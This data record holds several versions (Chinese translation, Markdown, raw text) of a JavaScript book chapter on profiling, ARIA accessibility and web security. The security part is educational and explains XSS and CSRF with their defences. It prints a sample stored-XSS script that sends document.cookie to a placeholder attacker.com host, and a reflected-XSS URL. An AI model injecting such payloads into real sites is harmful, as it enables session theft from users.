  trans: "\n\n- **浏览器开发者工具分析器 (Browser DevTools Profiler)**：大多数现代浏览器都在其开发者工具中内置了分析器。该工具允许你记录\
    \ CPU 使用情况、内存分配和其他性能指标。\n- **性能 API (Performance APIs)**：JavaScript 提供了多个性能 API，允许你衡量代码中特定部分的性能。\n\
    - **Lighthouse (Chrome 扩展程序或 Node.js 工具)**：Lighthouse 是一种用于提高网页质量的自动化工具。它包含一个审计部分，可以提供性能指标和建议。\n\
    \n我们将主要关注浏览器开发者工具分析器，因为它易于获取，且提供了全面的功能集。\n\n# 使用浏览器开发者工具分析器\n\n要在 Chrome 开发者工具中使用分析器（其他浏览器也类似）：\n\
    \n1. 打开开发者工具（在页面上右键点击并选择“检查”，或使用快捷键）。\n2. 转到“性能 (Performance)”面板。\n3. 点击“录制 (Record)”按钮（圆形）。\n\
    4. 与你的应用程序进行交互，以触发你想要分析的操作。\n5. 点击“停止 (Stop)”按钮。\n\n分析器随后将生成一份详细的报告，显示你的应用程序是如何消耗时间的。\n\
    \n# 解析分析器报告\n\n分析器报告通常包含几个部分：\n\n- **时间线 (Timeline)**：显示你的应用程序在录制期间时间消耗情况的可视化表示。你可以看到事件何时发生、持续了多久以及使用了多少\
    \ CPU。\n- **自底向上/调用堆栈树 (Bottom-Up/Call Tree)**：显示函数调用的层级视图，允许你查看调用了哪些函数以及在每个函数上花费了多少时间。这对于识别代码中的“热点”非常有用。\n\
    - **火焰图 (Flame Chart)**：提供了调用栈随时间演变的图形化表示。每个条形的宽度表示在某个函数上花费的时间。这是视觉化性能瓶颈的一种非常有效的方法。\n\
    \n# 识别常见的性能瓶颈\n\n在分析分析器报告时，寻找以下常见的性能瓶颈：\n\n- **耗时函数 (Long-Running Functions)**：执行时间较长的函数可能会阻塞主线程并导致\
    \ UI 无响应。寻找火焰图中的宽条形，或自底向上/调用堆栈树中具有高“自身时间 (Self Time)”的函数。\n- **频繁的函数调用 (Frequent\
    \ Function Calls)**：即使函数本身运行很快，多次调用函数也会影响性能。寻找调用堆栈树中被重复的函数。\n- **强制重流/布局抖动 (Forced\
    \ Reflows/Layout Thrashing)**：当浏览器必须在短时间内多次重新计算页面布局时发生。这可能是反复读取和写入影响布局的 DOM 属性引起的。\n\
    - **过度垃圾回收 (Excessive Garbage Collection)**：如果你的应用程序创建并丢弃大量对象，垃圾回收器可能会频繁运行，从而影响性能。观察分析器内存时间线中内存使用的的峰值。\n\
    \n# 示例场景与分析\n\n假设你正在分析一个看起来很慢的用户交互。在录制分析结果后，你在火焰图中看到一个长条，它对应于一个名为 `processData()`\
    \ 的函数。在自底向上视图中，你看到 `processData()` 具有高“自身时间 (Self Time)”，表明它花费了大量时间执行自身代码。\n\n\
    通过检查 `processData()` 的代码，你可能会发现它正在执行复杂的计算或遍历一个大型数组。这识别出 `processData()` 是一个性能瓶颈。然后你就可以专注于优化这个函数，例如使用更高效的算法或缓存结果。\n\
    \n# 使用性能 API\n\nJavaScript 的性能 API 提供了对性能衡量的更细粒度控制。例如，你可以使用 `performance.now()`\
    \ 来测量执行特定代码块所需的时间：\n\n```javascript\nconst startTime = performance.now();\n\n\
    // 测量的代码\nfor (let i = 0; i < 1000000; i++) {\n    // 某些操作\n}\n\nconst endTime\
    \ = performance.now();\nconst executionTime = endTime - startTime;\n\nconsole.log(`Execution\
    \ time: ${executionTime} milliseconds`);\n```\n\n# 实际考虑\n\n- **在真实环境中进行分析**：在与生产环境相似的环境中对应用程序进行分析。这包括使用类似的硬件、网络条件和数据集。\n\
    - **关注真实用户交互**：分析应用程序中用户频繁交互的部分。\n- **迭代与测量**：优化是一个迭代过程。在做出更改后，再次进行分析以衡量其影响。\n\
    \n通过使用分析工具和技术，你可以识别 JavaScript 代码中的性能瓶颈，并进行针对性的优化以改善用户体验。\n\n# 第 11 章. 可访问性与安全性最佳实践\n\
    \n## 构建可访问的 Web 应用 (ARIA，语义化 HTML)\n\n创建一个所有人（无论能力如何）都能使用的网站和应用程序不仅是一项良好的做法，更是本质的。可访问性确保残障人士能够感知、理解、导航并与你的\
    \ Web 内容进行交互。同样重要的是安全性。在当今的数字领域，保护用户数据和防止漏洞至关重要。本章将涵盖 JavaScript 开发者需要的关键可访问性和安全性最佳实践。我们将从构建可访问的\
    \ Web 应用开始。\n\n### 可访问性概述\n\n可访问性关于设计和开发供视觉、听觉、运动和认知障碍的人士使用的网站。构建可访问的网站不仅仅是为了包容性；它通常会提高所有人的体验。想想字幕如何帮助你在嘈杂环境中理解视频，或者清晰简洁的写作如何造福所有读者。\n\
    \n两个关键组件对 Web 可访问性有显著贡献：语义化 HTML 和 `ARIA`（可访问富富应用程序）。\n\n#### 语义化 HTML：赋予结构意义\n\
    \n语义化 HTML 使用 HTML 元素的其预期用途，为你的内容提供意义和结构。这不仅提高了可访问性，还让你的代码更具读性和可维护性。\n\n考虑以下示例：\n\
    - 使用 `<nav>` 标记导航菜单，而不是通用的 `<div>` 元素。\n- 使用 `<article>` 表示自包含的内容，如博客文章或新闻文章。\n\
    - 使用 `<aside>` 用于与主内容相关但对理解至关重要的内容，如侧边栏或相关链接。\n- 使用 `<form>`, `<input>`, `<label>`\
    \ 和 `<button>` 元素创建表单，而不是使用 <div> 和 JavaScript 创建自定义表单元素。\n\n使用语义化 HTML 元素有多个好处：\n\
    - **提高可访问性**：屏幕阅读器和其他辅助技术依赖语义化 HTML 来理解你内容的结构和意义。\n- **更好的 SEO**：搜索引擎也使用语义化 HTML\
    \ 来理解页面内容，这可以提高你的搜索引擎排名。\n- **更易维护的代码**：语义化 HTML 让你的代码更易读、更易理解，便于维护和更新。\n\n####\
    \ ARIA：弥补差距\n\n虽然语义化 HTML 为可访问性提供了坚实的基础，但它并没有涵盖所有可能的场景。`ARIA` 通过向辅助技术提供有关元素角色、状态和属性的额外信息来填补这些差距。\n\
    \n`ARIA` 属性通常用于三大类：\n- **角色 (Roles)**：定义用户界面元素的类型。例如，`role=\"button\"` 表示该元素应被视为按钮，即使它不是\
    \ `<button>` 元素。\n- **状态 (States)**：描述元素的当前状态。例如，`aria-checked=\"true\"` 表示复选框已选中。\n\
    \n"
- fmt: "\n- **Properties**: Provide additional information about an element. For example,\
    \ `aria-label=\"Close\"` provides a text label for an icon button.\n\nHere are\
    \ some common ARIA attributes and their use cases:\n\n- `aria-label`: Provides\
    \ a text label for an element, especially useful for icons or elements without\
    \ visible text.\n\n```html\n<button aria-label=\"Close\">\n  <img src=\"close-icon.png\"\
    \ alt=\"\" />\n</button>\n```\n\n- `aria-describedby`: Links an element to another\
    \ element that provides a description.\n\n```html\n<input type=\"text\" id=\"\
    username\" aria-describedby=\"username-description\">\n<span id=\"username-description\"\
    >Enter your username (at least 6 characters).</span>\n```\n\n- `aria-labelledby`:\
    \ Links an element to another element that provides a label. This is similar to\
    \ `<label for=\"\">` but can be used in more complex scenarios.\n\n- `aria-hidden=\"\
    true\"`: Hides an element from assistive technologies. Use this for purely decorative\
    \ elements that don't provide any meaningful information.\n\n- `role=\"alert\"\
    `: Indicates that an element contains important information that should be announced\
    \ to the user immediately.\n\n## Important Considerations When Using ARIA\n\n\
    - **Use ARIA only when necessary**: Don't use ARIA if you can achieve the same\
    \ result with semantic HTML. Semantic HTML is always preferred.\n- **Don't override\
    \ native semantics**: Don't use ARIA to change the meaning of a native HTML element.\
    \ For example, don't use `role=\"button\"` on an `<a>` element if it’s actually\
    \ a navigation link. Use `<button>` for buttons and `<a>` for links.\n- **Use\
    \ ARIA correctly**: Incorrectly used ARIA can actually make your website less\
    \ accessible. Consult the ARIA Authoring Practices Guide for best practices.\n\
    \n## Making JavaScript-Driven Interactions Accessible\n\nWhen using JavaScript\
    \ to create dynamic interactions, it’s crucial to ensure that these interactions\
    \ are also accessible. This includes:\n\n- **Keyboard Accessibility**: Ensure\
    \ that all interactive elements can be accessed and operated using the keyboard.\
    \ This usually involves using proper HTML elements (like buttons and links) and\
    \ handling keyboard events like `Tab`, `Enter`, and `Space`.\n- **Focus Management**:\
    \ Manage focus correctly so that users can navigate through interactive elements\
    \ using the keyboard. This often involves using JavaScript to set focus programmatically.\n\
    - **Dynamic Content Updates**: Use ARIA attributes like `aria-live` to inform\
    \ assistive technologies about dynamic content updates.\n\n## Testing for Accessibility\n\
    \nSeveral tools can help you test the accessibility of your website:\n\n- **Browser\
    \ Extensions**: Extensions like Accessibility Insights for Web (Chrome/Edge) and\
    \ `aXe` (Chrome/Firefox) can automatically detect many common accessibility issues.\n\
    - **Online Tools**: Online tools like WebAIM’s `WAVE` Web Accessibility Evaluation\
    \ Tool can also help you identify accessibility problems.\n- **Manual Testing\
    \ with Screen Readers**: Testing your website with a screen reader is essential\
    \ for understanding the experience of users with visual impairments. `NVDA` (Windows)\
    \ and `VoiceOver` (macOS) are popular screen readers.\n\nBy using semantic HTML\
    \ and ARIA correctly and testing your website for accessibility, you can create\
    \ a more inclusive and user-friendly experience for everyone.\n\n## Common Web\
    \ Security Vulnerabilities (XSS, CSRF)\n\nBuilding secure web applications is\
    \ just as important as building accessible ones. Security vulnerabilities can\
    \ expose user data, compromise system integrity, and damage your reputation. This\
    \ section covers two common web security vulnerabilities: Cross-Site Scripting\
    \ (XSS) and Cross-Site Request Forgery (CSRF). Understanding these vulnerabilities\
    \ is crucial for writing secure JavaScript code.\n\n### Cross-Site Scripting (XSS)\n\
    \nXSS vulnerabilities occur when an attacker can inject malicious JavaScript code\
    \ into a website that is then executed by other users' browsers. This can happen\
    \ when user-supplied data is displayed on the page without proper sanitization.\n\
    \nImagine a comment section on a blog. If the website doesn't properly sanitize\
    \ user input, an attacker could submit a comment containing malicious JavaScript\
    \ code, like this:\n\n```html\n<script>\n// This code steals user cookies and\
    \ sends them to an attacker's server\nfetch('https://attacker.com/steal-cookies?cookie='\
    \ + document.cookie);\n</script>\n```\n\nWhen other users view the blog post,\
    \ their browsers will execute this malicious script, potentially sending their\
    \ cookies (which often contain session information) to the attacker.\n\nThere\
    \ are three main types of XSS:\n\n- **Stored XSS**: The malicious script is stored\
    \ on the server (e.g., in a database) and then displayed to other users. This\
    \ is the most dangerous type of XSS. The blog comment example above is an example\
    \ of stored XSS.\n- **Reflected XSS**: The malicious script is injected into a\
    \ URL parameter and then reflected back to the user in the response. For example:\
    \ `https://example.com/search?q=<script>alert('XSS')</script>`. If the search\
    \ page displays the value of the `q` parameter without proper sanitization, the\
    \ script will be executed.\n- **DOM-based XSS**: The vulnerability exists in the\
    \ client-side JavaScript code itself. The malicious script is not sent to the\
    \ server but manipulates the `DOM` in a way that allows the script to be executed.\n\
    \n### Preventing XSS\n\nThe primary way to prevent XSS is to properly sanitize\
    \ user input before displaying it on the page. This involves escaping or encoding\
    \ special characters that have meaning in HTML and JavaScript.\n\n- **Output Encoding**:\
    \ Encode output based on the context where it is being used. For HTML output,\
    \ use HTML entity encoding (e.g., `<` becomes `&lt;`, `>` becomes `&gt;`). For\
    \ JavaScript output, use JavaScript encoding.\n- **Input Validation**: Validate\
    \ user input on the server-side to ensure that it conforms to expected formats.\
    \ This can help prevent the injection of malicious code.\n- **Content Security\
    \ Policy (CSP)**: CSP is a security standard that allows you to specify which\
    \ sources are allowed to load resources (scripts, styles, images, etc.) on your\
    \ website. This can help prevent the execution of injected scripts.\n- **Use a\
    \ Framework or Library with Built-in Protection**: Modern front-end frameworks\
    \ like `React` and `Angular` have built-in protection against XSS by default.\
    \ `React`, for example, escapes values inserted into the `DOM` using `JSX`.\n\n\
    ### Cross-Site Request Forgery (CSRF)\n\nCSRF attacks occur when an attacker tricks\
    \ a user into performing an unwanted action on a website where they are currently\
    \ authenticated.\n\nImagine a user is logged into their online banking account.\
    \ An attacker could send them an email containing a hidden form that automatically\
    \ submits a transfer request to the attacker's account. If the user clicks on\
    \ the link in the email while they are logged into their banking account, the\
    \ browser will automatically submit the form, performing the unwanted transfer.\n\
    \n### Preventing CSRF\n\nSeveral techniques can be used to prevent CSRF attacks:\n\
    \n- **CSRF Tokens**: The most common and effective way to prevent CSRF is to use\
    \ CSRF tokens. These are unique, randomly generated tokens that are included in\
    \ every form submission. The server verifies the token before processing the request.\
    \ This ensures that the request originated from the legitimate website and not\
    \ from an attacker's site.\n- **SameSite Cookies**: The `SameSite` attribute on\
    \ cookies can help prevent CSRF attacks by restricting when cookies are sent with\
    \ cross-site requests. Setting `SameSite=Strict` is the most secure option, but\
    \ it can break some legitimate cross-site functionality. `SameSite=Lax` is a more\
    \ balanced option that provides good protection while allowing some cross-site\
    \ requests.\n- **Double Submit Cookie**: This technique involves sending the CSRF\
    \ token both as a cookie and as a form field. The server verifies that both values\
    \ match.\n\n## JavaScript and Security\n"
  raw: '​● ​Properties:Provide additional information about an element. For example,
    aria-label="Close" provides a text label for an icon button.


    Here are some common ARIA attributes and their use cases:


    ​● ​aria-label: Provides a text label for an element, especially useful for icons
    or elements without visible text.


    HTML


    <button  aria-label="Close">


    <img  src="close-icon.png"  alt="" />


    </button>


    ​● ​aria-describedby: Links an element to another element that provides a description.


    HTML


    <input  type="text"  id="username"  aria-describedby="username-description">


    <span id="username-description">Enter your username (at least 6 characters).</span>


    ​● ​aria-labelledby: Links an element to another element that provides a label.
    This is similar to <label for=""> but can be used in more complex scenarios.


    ​● ​aria-hidden="true": Hides an element from assistive technologies. Use this
    for purely decorative elements that don''t provide any meaningful information.


    ​● ​role="alert": Indicates that an element contains important information that
    should be announced to the user immediately.


    Important Considerations When Using ARIA


    ​● ​Use ARIA only when necessary: Don''t use ARIA if you can achieve the same
    result with semantic HTML. Semantic HTML is always preferred.


    ​● ​Don''t override native semantics:Don''t use ARIA to change the meaning of
    a native HTML element. For example, don''t use role="button"on an <a>element if
    it’s actually a navigation link. Use <button>for buttons and <a> for links.


    ​● ​Use ARIA correctly: Incorrectly used ARIA can actually make your website less
    accessible. Consult the ARIA Authoring Practices Guide for best practices.


    Making JavaScript-Driven Interactions Accessible


    When using JavaScript to create dynamic interactions, it’s crucial to ensure that
    these interactions are also accessible. This includes:


    ​● ​Keyboard Accessibility:Ensure that all interactive elements can be accessed
    and operated using the keyboard. This usually involves using proper HTML elements
    (like buttons and links) and handling keyboard events like Tab, Enter, and Space.


    ​● ​Focus Management: Manage focus correctly so that users can navigate through
    interactive elements using the keyboard. This often involves using JavaScript
    to set focus programmatically.


    ​● ​Dynamic Content Updates:Use ARIA attributes like aria-live to inform assistive
    technologies about dynamic content updates.


    Testing for Accessibility


    Several tools can help you test the accessibility of your website:


    ​● ​Browser Extensions: Extensions like Accessibility Insights for Web (Chrome/Edge)
    and aXe (Chrome/Firefox) can automatically detect many common accessibility issues.


    ​● ​Online Tools: Online tools like WebAIM’s WAVE Web Accessibility Evaluation
    Tool can also help you identify accessibility problems.


    ​● ​Manual Testing with Screen Readers: Testing your website with a screen reader
    is essential for understanding the experience of users with visual impairments.
    NVDA (Windows) and VoiceOver (macOS) are popular screen readers.


    By using semantic HTML and ARIA correctly and testing your website for accessibility,
    you can create a more inclusive and user-friendly experience for everyone.


    ### Common Web Security Vulnerabilities (XSS, CSRF)


    Building secure web applications is just as important as building accessible ones.
    Security vulnerabilities can expose user data, compromise system integrity, and
    damage your reputation. This section covers two common web security vulnerabilities:
    Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). Understanding
    these vulnerabilities is crucial for writing secure JavaScript code.


    Cross-Site Scripting (XSS)


    XSS vulnerabilities occur when an attacker can inject malicious JavaScript code
    into a website that is then executed by other users'' browsers. This can happen
    when user-supplied data is displayed on the page without proper sanitization.


    Imagine a comment section on a blog. If the website doesn''t properly sanitize
    user input, an attacker could submit a comment containing malicious JavaScript
    code, like this:


    HTML


    <script>


    // This code steals user cookies and sends them to an attacker''s server


    fetch(''https://attacker.com/steal-cookies?cookie='' + document.cookie);


    </script>


    When other users view the blog post, their browsers will execute this malicious
    script, potentially sending their cookies (which often contain session information)
    to the attacker.


    There are three main types of XSS:


    ​● ​Stored XSS: The malicious script is stored on the server (e.g., in a database)
    and then displayed to other users. This is the most dangerous type of XSS. The
    blog comment example above is an example of stored XSS.


    ​● ​Reflected XSS:The malicious script is injected into a URL parameter and then
    reflected back to the user in the response. For example: https://example.com/search?q=<script>alert(''XSS'')</script>.
    If the search page displays the value of the q parameter without proper sanitization,
    the script will be executed.


    ​● ​DOM-based XSS: The vulnerability exists in the client-side JavaScript code
    itself. The malicious script is not sent to the server but manipulates the DOM
    in a way that allows the script to be executed.


    Preventing XSS


    The primary way to prevent XSS is to properly sanitize user input before displaying
    it on the page. This involves escaping or encoding special characters that have
    meaning in HTML and JavaScript.


    ​● ​Output Encoding:Encode output based on the context where it is being used.
    For HTML output, use HTML entity encoding (e.g., <becomes &lt;, >becomes &gt;).
    For JavaScript output, use JavaScript encoding.


    ​● ​Input Validation: Validate user input on the server-side to ensure that it
    conforms to expected formats. This can help prevent the injection of malicious
    code.


    ​● ​Content Security Policy (CSP): CSP is a security standard that allows you
    to specify which sources are allowed to load resources (scripts, styles, images,
    etc.) on your website. This can help prevent the execution of injected scripts.


    ​● ​Use a Framework or Library with Built-in Protection: Modern front-end frameworks
    like React and Angular have built-in protection against XSS by default. React,
    for example, escapes values inserted into the DOM using JSX.


    Cross-Site Request Forgery (CSRF)


    CSRF attacks occur when an attacker tricks a user into performing an unwanted
    action on a website where they are currently authenticated.


    Imagine a user is logged into their online banking account. An attacker could
    send them an email containing a hidden form that automatically submits a transfer
    request to the attacker''s account. If the user clicks on the link in the email
    while they are logged into their banking account, the browser will automatically
    submit the form, performing the unwanted transfer.


    Preventing CSRF


    Several techniques can be used to prevent CSRF attacks:


    ​● ​CSRF Tokens: The most common and effective way to prevent CSRF is to use CSRF
    tokens. These are unique, randomly generated tokens that are included in every
    form submission. The server verifies the token before processing the request.
    This ensures that the request originated from the legitimate website and not from
    an attacker''s site.


    ​● ​SameSite Cookies:The SameSiteattribute on cookies can help prevent CSRF attacks
    by restricting when cookies are sent with cross-site requests. Setting SameSite=Strictis
    the most secure option, but it can break some legitimate cross-site functionality.
    SameSite=Lax is a more balanced option that provides good protection while allowing
    some cross-site requests.


    ​● ​Double Submit Cookie: This technique involves sending the CSRF token both
    as a cookie and as a form field. The server verifies that both values match.


    JavaScript and Security'
